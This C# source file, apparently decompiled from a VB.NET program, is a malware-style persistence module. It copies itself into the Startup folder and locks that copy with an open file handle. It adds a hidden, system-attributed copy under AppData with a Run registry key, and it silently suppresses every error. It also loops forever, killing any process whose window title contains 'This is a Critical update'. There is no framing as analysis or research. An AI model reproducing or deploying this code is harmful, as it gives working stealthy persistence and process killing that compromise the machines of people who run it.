using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

[StandardModule]
internal sealed class Test
{
	public static object protect;

	private static Mutex mtx;

	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void Main()
	{
		bool createdNew = false;
		mtx = new Mutex(initiallyOwned: true, "s2LAoXMotgWmHTJG", out createdNew);
		if (!createdNew)
		{
			ProjectData.EndApp();
		}
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Path.GetFileNameWithoutExtension(Application.get_ExecutablePath()) + ".exe";
			if (!File.Exists(text))
			{
				File.Copy(Application.get_ExecutablePath(), text);
				File.SetAttributes(text, FileAttributes.Temporary);
			}
			protect = new FileStream(text, FileMode.Open);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string executablePath = Application.get_ExecutablePath();
			((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Path.GetFileNameWithoutExtension(executablePath), folderPath + "\\" + Path.GetFileName(executablePath));
			File.Copy(executablePath, folderPath + "\\" + Path.GetFileName(executablePath));
			File.SetAttributes(folderPath + "\\" + Path.GetFileName(executablePath), FileAttributes.Hidden | FileAttributes.System);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			while (true)
			{
				List<string> list = new List<string>(new string[1] { "This is a Critical update" });
				foreach (string item in list)
				{
					Process[] processes = Process.GetProcesses();
					Process[] array = processes;
					foreach (Process process in array)
					{
						if (process.MainWindowTitle.Contains(Conversions.ToString((object)item)))
						{
							process.Kill();
						}
					}
				}
				GC.Collect();
				Thread.Sleep(100);
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}
}
